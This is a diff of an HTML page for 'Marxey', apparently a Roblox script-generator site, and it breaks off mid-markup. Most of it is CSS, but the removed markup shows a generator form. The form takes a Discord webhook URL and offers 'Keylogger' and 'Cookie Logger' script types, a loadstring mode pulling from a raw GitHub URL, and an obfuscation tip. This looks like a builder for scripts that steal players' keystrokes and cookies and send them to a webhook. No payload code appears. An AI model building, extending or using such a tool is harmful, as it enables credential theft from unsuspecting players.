@@ -1,772 +1,494 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Marxey</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  body {
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-    background: #0a0a0a;
-    color: #e4e4e7;
-    height: 100vh;
-    display: flex;
-    overflow: hidden;
-  }
-
-  .sidebar {
-    width: 220px;
-    min-width: 220px;
-    background: #111114;
-    border-right: 1px solid #1f1f27;
-    display: flex;
-    flex-direction: column;
-    padding: 0;
-    overflow-y: auto;
-  }
-
-  .sidebar-logo {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 18px 16px 14px;
-    border-bottom: 1px solid #1f1f27;
-  }
-
-  .logo-icon {
-    width: 32px;
-    height: 32px;
-    background: linear-gradient(135deg, #7c3aed, #4f46e5);
-    border-radius: 8px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: 800;
-    font-size: 16px;
-    color: #fff;
-    flex-shrink: 0;
-  }
-
-  .logo-name { font-weight: 700; font-size: 16px; color: #fff; letter-spacing: -0.3px; }
-
-  .sidebar-section { padding: 12px 8px 4px; }
-
-  .sidebar-section-label {
-    font-size: 10px;
-    font-weight: 600;
-    color: #52525b;
-    text-transform: uppercase;
-    letter-spacing: 0.8px;
-    padding: 0 8px;
-    margin-bottom: 4px;
-  }
-
-  .nav-item {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 8px 10px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-size: 13.5px;
-    font-weight: 500;
-    color: #a1a1aa;
-    transition: all 0.15s;
-    margin-bottom: 1px;
-    user-select: none;
-    text-decoration: none;
-  }
-
-  .nav-item:hover { background: #1a1a24; color: #e4e4e7; }
-  .nav-item.active { background: #1e1b4b; color: #a78bfa; }
-  .nav-icon { width: 16px; height: 16px; flex-shrink: 0; opacity: 0.8; }
-
-  .sidebar-footer {
-    margin-top: auto;
-    padding: 12px 8px;
-    border-top: 1px solid #1f1f27;
-  }
-
-  .user-badge {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 8px 10px;
-    border-radius: 8px;
-    background: #18181f;
-    cursor: pointer;
-    transition: background 0.15s;
-  }
-
-  .user-badge:hover { background: #1f1f2e; }
-
-  .user-avatar {
-    width: 28px;
-    height: 28px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, #7c3aed, #4f46e5);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 12px;
-    font-weight: 700;
-    color: #fff;
-    flex-shrink: 0;
-  }
-
-  .user-name { font-size: 13px; font-weight: 500; color: #d4d4d8; }
-  .user-role { font-size: 11px; color: #52525b; }
-
-  .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-
-  .topbar {
-    height: 52px;
-    border-bottom: 1px solid #1f1f27;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 0 20px;
-    background: #0d0d12;
-    flex-shrink: 0;
-  }
-
-  .topbar-title { font-size: 15px; font-weight: 600; color: #e4e4e7; }
-  .topbar-right { display: flex; align-items: center; gap: 10px; }
-
-  .btn {
-    padding: 6px 14px;
-    border-radius: 7px;
-    font-size: 13px;
-    font-weight: 500;
-    cursor: pointer;
-    border: none;
-    transition: all 0.15s;
-  }
-
-  .btn-discord { background: #5865f2; color: #fff; display: flex; align-items: center; gap: 6px; }
-  .btn-discord:hover { background: #4752c4; }
-  .btn-primary { background: #7c3aed; color: #fff; }
-  .btn-primary:hover { background: #6d28d9; }
-  .btn-ghost { background: #1a1a24; color: #a1a1aa; border: 1px solid #27272e; }
-  .btn-ghost:hover { background: #22222e; color: #d4d4d8; }
-  .btn-sm { padding: 5px 10px; font-size: 12px; }
-
-  .content {
-    flex: 1;
-    overflow-y: auto;
-    padding: 24px;
-    display: flex;
-    flex-direction: column;
-    gap: 20px;
-  }
-
-  .page { display: none; }
-  .page.active { display: flex; flex-direction: column; gap: 20px; }
-
-  .card { background: #111114; border: 1px solid #1f1f27; border-radius: 12px; overflow: hidden; }
-
-  .card-header {
-    padding: 14px 18px;
-    border-bottom: 1px solid #1f1f27;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-  }
-
-  .card-title { font-size: 13.5px; font-weight: 600; color: #e4e4e7; display: flex; align-items: center; gap: 8px; }
-  .card-body { padding: 18px; }
-
-  label { font-size: 12px; font-weight: 500; color: #71717a; display: block; margin-bottom: 6px; }
-
-  input, textarea, select {
-    width: 100%;
-    background: #18181f;
-    border: 1px solid #27272e;
-    border-radius: 8px;
-    color: #e4e4e7;
-    font-size: 13px;
-    padding: 9px 12px;
-    font-family: inherit;
-    outline: none;
-    transition: border-color 0.15s;
-    resize: vertical;
-  }
-
-  input:focus, textarea:focus, select:focus {
-    border-color: #7c3aed;
-    box-shadow: 0 0 0 2px rgba(124,58,237,0.15);
-  }
-
-  textarea { min-height: 120px; font-family: 'Courier New', monospace; font-size: 12px; }
-  select option { background: #18181f; }
-  .form-grid { display: grid; gap: 14px; }
-  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-  .form-group { display: flex; flex-direction: column; }
-
-  .badge { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: 20px; font-size: 11px; font-weight: 500; }
-  .badge-purple { background: #1e1b4b; color: #a78bfa; border: 1px solid #312e81; }
-  .badge-green { background: #052e16; color: #4ade80; border: 1px solid #14532d; }
-  .badge-blue { background: #0c1a3b; color: #60a5fa; border: 1px solid #1e3a6e; }
-
-  .script-layout { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-
-  .output-box {
-    background: #0d0d12;
-    border: 1px solid #1f1f27;
-    border-radius: 8px;
-    padding: 12px;
-    font-family: 'Courier New', monospace;
-    font-size: 11.5px;
-    color: #a78bfa;
-    min-height: 120px;
-    white-space: pre-wrap;
-    word-break: break-all;
-    overflow-y: auto;
-    max-height: 200px;
-  }
-
-  .copy-row { display: flex; align-items: center; justify-content: space-between; margin-top: 10px; }
-
-  .tabs { display: flex; gap: 4px; background: #18181f; border-radius: 8px; padding: 3px; width: fit-content; }
-  .tab { padding: 6px 14px; border-radius: 6px; font-size: 12.5px; font-weight: 500; color: #71717a; cursor: pointer; transition: all 0.15s; user-select: none; }
-  .tab.active { background: #27272e; color: #e4e4e7; }
-  .tab:hover:not(.active) { color: #a1a1aa; }
-
-  .brainrots-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
-
-  .brainrot-card {
-    background: #18181f;
-    border: 1px solid #27272e;
-    border-radius: 10px;
-    padding: 12px 10px;
-    text-align: center;
-    cursor: pointer;
-    transition: all 0.15s;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 6px;
-  }
-
-  .brainrot-card:hover { border-color: #7c3aed; background: #1a1528; }
-  .brainrot-card.selected { border-color: #7c3aed; background: #1e1b4b; }
-  .brainrot-emoji { font-size: 28px; }
-  .brainrot-name { font-size: 10.5px; font-weight: 500; color: #a1a1aa; line-height: 1.3; }
-
-  .search-bar { position: relative; margin-bottom: 16px; }
-  .search-bar input { padding-left: 36px; }
-  .search-icon { position: absolute; left: 11px; top: 50%; transform: translateY(-50%); color: #52525b; }
-
-  .chat-layout { display: flex; flex-direction: column; height: 420px; }
-
-  .chat-messages {
-    flex: 1;
-    overflow-y: auto;
-    padding: 14px;
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    background: #0d0d12;
-    border-radius: 8px 8px 0 0;
-    border: 1px solid #1f1f27;
-    border-bottom: none;
-  }
-
-  .chat-msg { display: flex; align-items: flex-start; gap: 10px; }
-
-  .chat-avatar {
-    width: 26px;
-    height: 26px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, #7c3aed, #4f46e5);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 11px;
-    font-weight: 700;
-    color: #fff;
-    flex-shrink: 0;
-  }
-
-  .chat-msg-content { flex: 1; }
-  .chat-msg-header { display: flex; align-items: center; gap: 6px; margin-bottom: 2px; }
-  .chat-username { font-size: 12px; font-weight: 600; color: #a78bfa; }
-  .chat-time { font-size: 10.5px; color: #3f3f46; }
-  .chat-text { font-size: 13px; color: #d4d4d8; line-height: 1.4; }
-
-  .chat-input-row {
-    display: flex;
-    gap: 8px;
-    padding: 10px;
-    background: #18181f;
-    border: 1px solid #1f1f27;
-    border-radius: 0 0 8px 8px;
-  }
-
-  .chat-input-row input { flex: 1; margin: 0; }
-
-  .leaderboard-table { width: 100%; border-collapse: collapse; }
-  .leaderboard-table th { text-align: left; padding: 10px 14px; font-size: 11px; font-weight: 600; color: #52525b; text-transform: uppercase; letter-spacing: 0.6px; border-bottom: 1px solid #1f1f27; }
-  .leaderboard-table td { padding: 11px 14px; font-size: 13px; color: #d4d4d8; border-bottom: 1px solid #18181f; }
-  .leaderboard-table tr:last-child td { border-bottom: none; }
-  .leaderboard-table tr:hover td { background: #14141c; }
-  .rank-gold { color: #fbbf24; font-weight: 700; }
-  .rank-silver { color: #94a3b8; font-weight: 700; }
-  .rank-bronze { color: #c2855c; font-weight: 700; }
-
-  .home-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; }
-  .stat-card { background: #111114; border: 1px solid #1f1f27; border-radius: 12px; padding: 18px; }
-  .stat-label { font-size: 12px; color: #52525b; margin-bottom: 6px; }
-  .stat-value { font-size: 24px; font-weight: 700; color: #e4e4e7; }
-  .stat-sub { font-size: 11.5px; color: #3f3f46; margin-top: 4px; }
-
-  .ad-preview { background: #0d0d12; border: 1px solid #7c3aed; border-radius: 10px; padding: 16px; font-size: 13px; color: #a78bfa; min-height: 80px; }
-
-  .toast-container { position: fixed; bottom: 20px; right: 20px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
-
-  .toast {
-    background: #1a1a24;
-    border: 1px solid #27272e;
-    border-radius: 10px;
-    padding: 12px 16px;
-    font-size: 13px;
-    color: #d4d4d8;
-    min-width: 220px;
-    box-shadow: 0 8px 24px rgba(0,0,0,0.4);
-    animation: slideIn 0.2s ease;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-
-  @keyframes slideIn {
-    from { transform: translateX(100%); opacity: 0; }
-    to { transform: translateX(0); opacity: 1; }
-  }
-
-  .login-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.7);
-    backdrop-filter: blur(6px);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 1000;
-  }
-
-  .login-modal {
-    background: #111114;
-    border: 1px solid #27272e;
-    border-radius: 16px;
-    padding: 36px 32px;
-    text-align: center;
-    max-width: 360px;
-    width: 100%;
-  }
-
-  .login-modal .logo-icon { width: 52px; height: 52px; font-size: 22px; margin: 0 auto 16px; }
-  .login-modal h2 { font-size: 20px; font-weight: 700; color: #fff; margin-bottom: 6px; }
-  .login-modal p { font-size: 13.5px; color: #71717a; margin-bottom: 24px; line-height: 1.5; }
-  .login-modal .btn-discord { width: 100%; justify-content: center; padding: 11px 20px; font-size: 14px; font-weight: 600; border-radius: 10px; }
-
-  ::-webkit-scrollbar { width: 5px; height: 5px; }
-  ::-webkit-scrollbar-track { background: transparent; }
-  ::-webkit-scrollbar-thumb { background: #27272e; border-radius: 4px; }
-  ::-webkit-scrollbar-thumb:hover { background: #3f3f46; }
-
-  .empty-state { text-align: center; padding: 40px 20px; color: #3f3f46; font-size: 13px; }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Marxey</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{min-height:100vh;font-family:Inter,sans-serif;color:#f1f5f9;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);display:flex;flex-direction:column}
+    nav{display:flex;align-items:center;justify-content:space-between;padding:1rem 1.5rem;border-bottom:1px solid rgba(167,139,250,.2);background:rgba(0,0,0,.2)}
+    .nav-left{display:flex;align-items:center;gap:1.5rem}
+    .logo{font-size:1.1rem;font-weight:800;background:linear-gradient(90deg,#a78bfa,#f472b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;cursor:pointer}
+    .nav-link{color:#c4b5fd;font-size:.875rem;cursor:pointer;background:none;border:none;font-family:inherit}
+    .nav-link:hover{color:#fff}
+    .nav-right{display:flex;align-items:center;gap:.75rem}
+    .user-info{display:flex;align-items:center;gap:.5rem;font-size:.875rem;color:#ddd6fe}
+    .user-avatar{width:28px;height:28px;border-radius:50%;object-fit:cover}
+    .user-avatar-ph{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#db2777);display:inline-flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:#fff;flex-shrink:0}
+    .btn-discord{display:flex;align-items:center;gap:.5rem;background:#5865F2;color:#fff;font-size:.875rem;font-weight:600;padding:.5rem 1rem;border:none;border-radius:.5rem;cursor:pointer;text-decoration:none}
+    .btn-discord:hover{background:#4752c4}
+    .btn-logout{font-size:.75rem;color:#a78bfa;border:1px solid rgba(167,139,250,.4);background:none;padding:.375rem .75rem;border-radius:.5rem;cursor:pointer;font-family:inherit}
+    .btn-logout:hover{color:#fff}
+    main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:2.5rem 1rem}
+    .container{width:100%;max-width:680px;display:flex;flex-direction:column;gap:2rem}
+    h1{text-align:center;font-size:2.2rem;font-weight:800;background:linear-gradient(90deg,#a78bfa,#f472b6,#fb923c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+    .subtitle{text-align:center;color:#c4b5fd;font-size:.875rem;margin-top:.4rem}
+    .card{background:rgba(255,255,255,.05);border:1px solid rgba(167,139,250,.3);backdrop-filter:blur(10px);border-radius:1rem;padding:1.5rem;display:flex;flex-direction:column;gap:1.25rem}
+    .card.green{border-color:rgba(74,222,128,.3)}
+    label{display:block;font-size:.875rem;font-weight:600;color:#ddd6fe;margin-bottom:.4rem}
+    label span{color:rgba(167,139,250,.6);font-weight:400;font-size:.75rem;margin-left:.4rem}
+    input,textarea{width:100%;background:rgba(255,255,255,.07);border:1px solid rgba(167,139,250,.3);border-radius:.5rem;padding:.625rem 1rem;font-size:.875rem;color:#f1f5f9;outline:none;font-family:inherit;transition:border-color .15s}
+    input:focus,textarea:focus{border-color:#a78bfa}
+    input::placeholder,textarea::placeholder{color:rgba(167,139,250,.4)}
+    textarea{resize:none;font-family:monospace}
+    .row{display:flex;gap:.5rem}
+    .row input{flex:1}
+    .btn-lookup{background:linear-gradient(135deg,#7c3aed,#a21caf);color:#fff;font-size:.875rem;font-weight:600;padding:0 1rem;border:none;border-radius:.5rem;cursor:pointer;white-space:nowrap;font-family:inherit}
+    .btn-lookup:disabled{opacity:.5;cursor:not-allowed}
+    .error-msg{color:#f87171;font-size:.75rem;margin-top:.25rem}
+    .success-msg{color:#4ade80;font-size:.75rem;margin-top:.25rem}
+    .hint{color:rgba(167,139,250,.55);font-size:.75rem;margin-top:.25rem}
+    .hint a{color:#a78bfa;text-decoration:underline}
+    .hint a:hover{color:#f472b6}
+    .hint code{color:#f9a8d4}
+    .btn-row{display:flex;gap:.75rem;flex-wrap:wrap}
+    .btn-generate{flex:1;min-width:150px;background:linear-gradient(135deg,#7c3aed,#db2777,#ea580c);color:#fff;font-weight:700;font-size:.9rem;padding:.75rem;border:none;border-radius:.5rem;cursor:pointer;transition:opacity .15s,transform .1s;font-family:inherit}
+    .btn-generate:hover{opacity:.9}
+    .btn-generate:active{transform:scale(.98)}
+    .btn-save{background:rgba(255,255,255,.1);border:1px solid rgba(167,139,250,.3);color:#fff;font-size:.875rem;font-weight:600;padding:0 1.25rem;border-radius:.5rem;cursor:pointer;font-family:inherit}
+    .btn-save.saved{background:linear-gradient(135deg,#16a34a,#15803d);border-color:transparent}
+    .output-header{display:flex;align-items:center;justify-content:space-between;gap:.5rem;flex-wrap:wrap}
+    .output-label{font-size:.875rem;font-weight:600;color:#86efac}
+    .btn-copy{font-size:.75rem;font-weight:600;background:linear-gradient(135deg,#7c3aed,#a21caf);color:#fff;border:none;padding:.375rem .75rem;border-radius:.5rem;cursor:pointer;font-family:inherit}
+    .btn-copy.copied{background:linear-gradient(135deg,#16a34a,#15803d)}
+    pre{font-size:.75rem;color:#4ade80;background:rgba(0,0,0,.4);border:1px solid rgba(74,222,128,.2);border-radius:.5rem;padding:1rem;overflow-x:auto;white-space:pre-wrap;word-break:break-all;line-height:1.6;font-family:monospace}
+    .obfuscate-tip{font-size:.78rem;color:rgba(167,139,250,.65);text-align:center;padding:.5rem 0}
+    .obfuscate-tip a{color:#a78bfa;text-decoration:underline;font-weight:600}
+    .obfuscate-tip a:hover{color:#f472b6}
+    .picker-label-row{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.5rem;margin-bottom:.4rem}
+    .picker-label-row label{margin-bottom:0}
+    .btn-select-all,.btn-clear-all{font-size:.7rem;font-weight:600;padding:.25rem .6rem;border-radius:.375rem;cursor:pointer;border:1px solid rgba(167,139,250,.4);background:none;color:#c4b5fd;font-family:inherit}
+    .btn-select-all:hover,.btn-clear-all:hover{background:rgba(167,139,250,.15)}
+    .picker-btns{display:flex;gap:.4rem}
+    .picker-search{margin-bottom:.6rem}
+    .tags-selected{display:flex;flex-wrap:wrap;gap:.4rem;min-height:36px;margin-bottom:.6rem;padding:.5rem;background:rgba(0,0,0,.2);border:1px solid rgba(167,139,250,.2);border-radius:.5rem}
+    .tag{display:flex;align-items:center;gap:.35rem;background:linear-gradient(135deg,rgba(124,58,237,.5),rgba(219,39,119,.5));border:1px solid rgba(167,139,250,.4);border-radius:1rem;padding:.25rem .6rem;font-size:.75rem;color:#ddd6fe;white-space:nowrap}
+    .tag-x{cursor:pointer;color:#f9a8d4;font-size:.8rem;line-height:1;border:none;background:none;padding:0;font-weight:700}
+    .tag-x:hover{color:#f87171}
+    .tags-placeholder{color:rgba(167,139,250,.4);font-size:.8rem;align-self:center}
+    .brainrot-grid{display:flex;flex-wrap:wrap;gap:.3rem;max-height:220px;overflow-y:auto;padding:.25rem 0}
+    .brainrot-grid::-webkit-scrollbar{width:4px}
+    .brainrot-grid::-webkit-scrollbar-track{background:transparent}
+    .brainrot-grid::-webkit-scrollbar-thumb{background:rgba(167,139,250,.4);border-radius:2px}
+    .brainrot-chip{font-size:.73rem;padding:.25rem .6rem;border-radius:1rem;cursor:pointer;border:1px solid rgba(167,139,250,.25);background:rgba(255,255,255,.05);color:#c4b5fd;transition:all .1s;user-select:none}
+    .brainrot-chip:hover{border-color:rgba(167,139,250,.6);background:rgba(167,139,250,.15);color:#fff}
+    .brainrot-chip.selected{background:linear-gradient(135deg,rgba(124,58,237,.6),rgba(219,39,119,.6));border-color:rgba(167,139,250,.7);color:#fff}
+    .brainrot-chip.hidden{display:none}
+    #page-uploader{display:none}
+    .btn-upload{width:100%;background:linear-gradient(135deg,#0369a1,#0ea5e9);color:#fff;font-weight:700;font-size:.9rem;padding:.75rem;border:none;border-radius:.5rem;cursor:pointer;transition:opacity .15s;font-family:inherit}
+    .btn-upload:hover{opacity:.9}
+    .btn-upload:disabled{opacity:.5;cursor:not-allowed}
+    .btn-upload.done{background:linear-gradient(135deg,#16a34a,#15803d)}
+    .result-box{background:rgba(0,0,0,.4);border:1px solid rgba(56,189,248,.3);border-radius:.5rem;padding:.875rem}
+    .result-label{font-size:.75rem;font-weight:600;color:#7dd3fc;margin-bottom:.5rem}
+    .result-row{display:flex;gap:.5rem}
+    .result-row input{flex:1;font-family:monospace;font-size:.75rem;color:#7dd3fc;background:rgba(255,255,255,.05);border-color:rgba(56,189,248,.3)}
+    .btn-copy-result{font-size:.75rem;font-weight:600;background:linear-gradient(135deg,#0369a1,#0ea5e9);color:#fff;border:none;padding:.375rem .75rem;border-radius:.5rem;cursor:pointer;white-space:nowrap;font-family:inherit}
+    .btn-copy-result.copied{background:linear-gradient(135deg,#16a34a,#15803d)}
+    #page-leaderboard{display:none}
+    .lb-card{background:rgba(255,255,255,.05);border:1px solid rgba(167,139,250,.3);border-radius:1rem;overflow:hidden}
+    table{width:100%;font-size:.875rem;border-collapse:collapse}
+    th{text-align:left;padding:.75rem 1.25rem;color:#c4b5fd;font-weight:600;background:rgba(255,255,255,.03);border-bottom:1px solid rgba(167,139,250,.2)}
+    th.right,td.right{text-align:right}
+    td{padding:.875rem 1.25rem;border-bottom:1px solid rgba(167,139,250,.1);color:#f1f5f9}
+    tr:hover td{background:rgba(255,255,255,.03)}
+    .lb-user{display:flex;align-items:center;gap:.75rem}
+    .lb-avatar{width:32px;height:32px;border-radius:50%;object-fit:cover}
+    .lb-avatar-ph{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#db2777);display:flex;align-items:center;justify-content:center;font-size:.8rem;font-weight:700;color:#fff}
+    .lb-count{font-weight:700;background:linear-gradient(90deg,#a78bfa,#f472b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+    .lb-empty{padding:3rem;text-align:center;color:#c4b5fd;font-size:.875rem}
+    .rank{font-weight:700;color:#fff}
+    #loading-overlay{position:fixed;inset:0;background:rgba(15,12,41,.95);display:flex;align-items:center;justify-content:center;z-index:999;color:#c4b5fd;font-size:1rem;gap:.75rem}
+    #loading-overlay.hidden{display:none}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
 </head>
 <body>
 
-<aside class="sidebar">
-  <div class="sidebar-logo">
-    <div class="logo-icon">M</div>
-    <span class="logo-name">Marxey</span>
-  </div>
-
-  <div class="sidebar-section">
-    <div class="sidebar-section-label">General</div>
-    <a class="nav-item active" onclick="navigate('home')">
-      <svg class="nav-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-      Home
-    </a>
-    <a class="nav-item" onclick="navigate('generator')">
-      <svg class="nav-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-      Script Generator
-    </a>
-    <a class="nav-item" onclick="navigate('brainrots')">
-      <svg class="nav-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg>
-      Brainrots
-    </a>
-    <a class="nav-item" onclick="navigate('trade')">
-      <svg class="nav-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 014-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 01-4 4H3"/></svg>
-      Marxey Script Trade
-    </a>
-    <a class="nav-item" onclick="navigate('advertise')">
-      <svg class="nav-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M3 11l19-9-9 19-2-8-8-2z"/></svg>
-      Advertise
-    </a>
-  </div>
-
-  <div class="sidebar-section">
-    <div class="sidebar-section-label">Community</div>
-    <a class="nav-item" onclick="navigate('chat')">
-      <svg class="nav-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
-      Chat
-    </a>
-    <a class="nav-item" onclick="navigate('leaderboard')">
-      <svg class="nav-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><polyline points="18 20 18 10"/><polyline points="12 20 12 4"/><polyline points="6 20 6 14"/></svg>
-      Leaderboard
-    </a>
-  </div>
-
-  <div class="sidebar-footer">
-    <div id="sidebar-user" class="user-badge" style="display:none">
-      <div class="user-avatar" id="user-av">?</div>
-      <div>
-        <div class="user-name" id="user-name-display">Guest</div>
-        <div class="user-role">Signed in</div>
-      </div>
-    </div>
-    <div id="sidebar-login" class="user-badge" onclick="showLogin()">
-      <div class="user-avatar">?</div>
-      <div>
-        <div class="user-name">Not signed in</div>
-        <div class="user-role">Click to sign in</div>
-      </div>
-    </div>
-  </div>
-</aside>
-
-<div class="main">
-  <div class="topbar">
-    <span class="topbar-title" id="page-title">Home</span>
-    <div class="topbar-right">
-      <span class="badge badge-purple">● Live</span>
-      <button class="btn btn-discord" id="topbar-auth-btn" onclick="showLogin()">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.04.033.05a19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
-        Sign in with Discord
-      </button>
-    </div>
-  </div>
-
-  <div class="content">
-
-    <!-- HOME -->
-    <div class="page active" id="page-home">
-      <div class="home-grid">
-        <div class="stat-card"><div class="stat-label">Scripts Generated</div><div class="stat-value">2,847</div><div class="stat-sub">+124 today</div></div>
-        <div class="stat-card"><div class="stat-label">Active Users</div><div class="stat-value">391</div><div class="stat-sub">Online now</div></div>
-        <div class="stat-card"><div class="stat-label">Brainrots</div><div class="stat-value">80+</div><div class="stat-sub">Characters available</div></div>
-      </div>
-      <div class="card">
-        <div class="card-header"><div class="card-title">⚡ Quick Start</div></div>
-        <div class="card-body">
-          <p style="font-size:13.5px;color:#71717a;line-height:1.6;margin-bottom:16px;">Welcome to <strong style="color:#a78bfa">Marxey</strong> — paste your script, set your webhook and username, pick a brainrot, and generate your output instantly.</p>
-          <button class="btn btn-primary" onclick="navigate('generator')">Open Script Generator →</button>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-header"><div class="card-title">History</div><span class="badge badge-blue">Recent</span></div>
-        <div class="card-body"><div class="empty-state">No logs yet — generate your first script to see history here.</div></div>
-      </div>
-    </div>
-
-    <!-- SCRIPT GENERATOR -->
-    <div class="page" id="page-generator">
-      <div style="display:flex;align-items:center;justify-content:space-between">
-        <div class="tabs" id="gen-tabs">
-          <div class="tab active" onclick="switchTab('normal')">Normal Mode</div>
-          <div class="tab" onclick="switchTab('loadstring')">Loadstring Mode</div>
-        </div>
-        <span class="badge badge-green">● Ready</span>
-      </div>
-      <div class="script-layout">
-        <div style="display:flex;flex-direction:column;gap:14px">
-          <div class="card">
-            <div class="card-header"><div class="card-title">Configuration</div></div>
-            <div class="card-body form-grid">
-              <div class="form-group"><label>Webhook URL</label><input type="text" id="webhook-input" placeholder="https://discord.com/api/webhooks/..." /></div>
-              <div class="form-group"><label>Username</label><input type="text" id="username-input" placeholder="e.g. Username" maxlength="64" /></div>
-              <div class="form-row">
-                <div class="form-group"><label>Title</label><input type="text" id="title-input" placeholder="My Script" /></div>
-                <div class="form-group"><label>Type</label><select id="type-select"><option>Executor</option><option>Keylogger</option><option>Cookie Logger</option><option>Custom</option></select></div>
-              </div>
-              <div class="form-group" id="loadstring-url-row" style="display:none"><label>Loadstring URL</label><input type="text" id="loadstring-url" placeholder="https://raw.githubusercontent.com/..." /></div>
-              <div class="form-group" id="script-paste-row"><label>Paste Your Script</label><textarea id="script-input" placeholder="-- Paste your Lua/Roblox script here..."></textarea></div>
-            </div>
-          </div>
-        </div>
-        <div style="display:flex;flex-direction:column;gap:14px">
-          <div class="card">
-            <div class="card-header"><div class="card-title">Output</div></div>
-            <div class="card-body">
-              <div class="output-box" id="output-box">-- Output will appear here after generation...</div>
-              <div class="copy-row">
-                <span style="font-size:11px;color:#3f3f46" id="output-status">Ready to generate</span>
-                <button class="btn btn-ghost btn-sm" onclick="copyOutput()">Copy Output</button>
-              </div>
-            </div>
-          </div>
-          <div class="card">
-            <div class="card-header"><div class="card-title">Selected Brainrot</div><button class="btn btn-ghost btn-sm" onclick="navigate('brainrots')">Browse →</button></div>
-            <div class="card-body" id="selected-brainrot-display"><div class="empty-state" style="padding:20px">No brainrot selected. Go to Brainrots to pick one.</div></div>
-          </div>
-          <button class="btn btn-primary" style="width:100%;padding:12px;font-size:14px;font-weight:600;border-radius:10px" onclick="generateScript()">⚡ Generate Script</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- BRAINROTS -->
-    <div class="page" id="page-brainrots">
-      <div class="search-bar">
-        <svg class="search-icon" width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-        <input type="text" id="brainrot-search" placeholder="Search brainrots..." oninput="filterBrainrots()" />
-      </div>
-      <div class="brainrots-grid" id="brainrots-grid"></div>
-    </div>
-
-    <!-- TRADE -->
-    <div class="page" id="page-trade">
-      <div class="card">
